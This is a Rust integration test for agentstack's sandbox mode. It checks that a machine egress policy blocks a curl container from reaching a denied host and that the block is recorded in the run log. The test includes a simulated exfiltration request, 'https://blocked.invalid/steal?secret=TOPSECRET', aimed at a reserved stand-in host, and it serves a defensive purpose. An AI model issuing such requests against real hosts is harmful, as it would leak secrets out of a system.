// Integration test: unwraps/expects in free helper fns aren't seen as
// "in tests" by clippy's allow-unwrap-in-tests (only #[test] fns are),
// so opt the whole test file out of the workspace unwrap_used deny.
#![allow(clippy::unwrap_used, clippy::expect_used)]

//! The sandbox-egress demo driven through the REAL `agentstack run --sandbox`
//! binary (not the test harness) — Docker-gated.
//!
//! A machine policy denies a host; the CLI stands up the egress proxy, runs a
//! real `curl` container whose HTTPS egress is pointed at that proxy, and the
//! container's attempt to reach the denied host is blocked at the proxy and
//! recorded in the run's flight-recorder log — which the test reads back the
//! way `agentstack report <run>` would.
//!
//! Hermetic: the denied target is `blocked.invalid` (RFC-2606 reserved, never
//! resolves), so the proxy refuses the CONNECT before any network is touched —
//! no sink, no internet. Compiles only with `--features sandbox`; SKIPS when no
//! Docker daemon or curl image is available. Run it where Docker exists:
//!   cargo test -p agentstack --features sandbox --test sandbox_cli_e2e -- --nocapture
#![cfg(feature = "sandbox")]

use std::fs;
use std::process::Command;

use agentstack::calllog::{RunEvent, RunLog};

const IMAGE: &str = "curlimages/curl:latest";
const DENIED: &str = "blocked.invalid";

fn docker_and_image() -> bool {
    let up = Command::new("docker")
        .arg("info")
        .output()
        .map(|o| o.status.success())
        .unwrap_or(false);
    if !up {
        eprintln!("SKIP: no Docker daemon");
        return false;
    }
    let pulled = Command::new("docker")
        .args(["pull", IMAGE])
        .status()
        .map(|s| s.success())
        .unwrap_or(false);
    if !pulled {
        eprintln!("SKIP: cannot pull {IMAGE}");
        return false;
    }
    true
}

/// Strip ANSI escape sequences so the run id (printed dimmed) is parseable.
fn strip_ansi(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    let mut chars = s.chars().peekable();
    while let Some(c) = chars.next() {
        if c == '\u{1b}' {
            // Skip until the terminating 'm' of a CSI sequence.
            for n in chars.by_ref() {
                if n == 'm' {
                    break;
                }
            }
        } else {
            out.push(c);
        }
    }
    out
}

#[test]
fn cli_run_sandbox_blocks_denied_egress_and_records_it() {
    if !docker_and_image() {
        return;
    }

    let tmp = assert_fs::TempDir::new().unwrap();
    let home = tmp.path().join("home");
    let as_home = home.join(".agentstack");
    fs::create_dir_all(as_home.join("adapters")).unwrap();

    // Machine policy DENIES the target host (rename-proof "*" key).
    fs::write(
        as_home.join("agentstack.toml"),
        format!("version = 1\n[policy.egress]\n\"*\" = [\"!{DENIED}\"]\n"),
    )
    .unwrap();
    // A throwaway harness whose launch binary is `curl`, so `run --sandbox`
    // builds the container command as `curl <args>`.
    fs::write(
        as_home.join("adapters/curltest.yaml"),
        "id: curltest\ndisplay: Curl Test\ndetect:\n  bin: curl\n",
    )
    .unwrap();

    let proj = tmp.path().join("proj");
    fs::create_dir_all(&proj).unwrap();
    fs::write(proj.join("agentstack.toml"), "version = 1\n").unwrap();

    // Drive the REAL binary. curl reads the HTTPS_PROXY the CLI injects and
    // sends CONNECT blocked.invalid:443 to the proxy, which the policy denies.
    let out = Command::new(env!("CARGO_BIN_EXE_agentstack"))
        .args([
            "run",
            "--sandbox",
            "curltest",
            "--",
            "-sS",
            "-m",
            "6",
            &format!("https://{DENIED}/steal?secret=TOPSECRET"),
        ])
        .current_dir(&proj)
        .env("HOME", &home)
        .env("AGENTSTACK_HOME", &as_home)
        .env("AGENTSTACK_SANDBOX_IMAGE", IMAGE)
        .output()
        .unwrap();

    let stdout = strip_ansi(&String::from_utf8_lossy(&out.stdout));
    eprintln!("--- run --sandbox stdout ---\n{stdout}");

    // Parse the run id ("... (run r-XXXX)").
    let run_id = stdout
        .split_whitespace()
        .find(|w| w.starts_with("r-"))
        .map(|w| w.trim_end_matches([')', '.']).to_string())
        .expect("run --sandbox prints a run id");

    // Read the run's flight-recorder log (as `agentstack report` would).
    std::env::set_var("AGENTSTACK_HOME", &as_home);
    let events = RunLog::read(&run_id);
    eprintln!("--- run {run_id} events ---\n{events:#?}");

    let blocked = events
        .iter()
        .any(|e| matches!(e, RunEvent::Egress { allowed: false, host, .. } if host == DENIED));
    assert!(
        blocked,
        "the CLI must record a policy BLOCK of egress to {DENIED}: {events:?}"
    );
    // And the run recorded its lifecycle.
    assert!(
        events
            .iter()
            .any(|e| matches!(e, RunEvent::SandboxStarted { .. })),
        "the run should be recorded as started"
    );
}
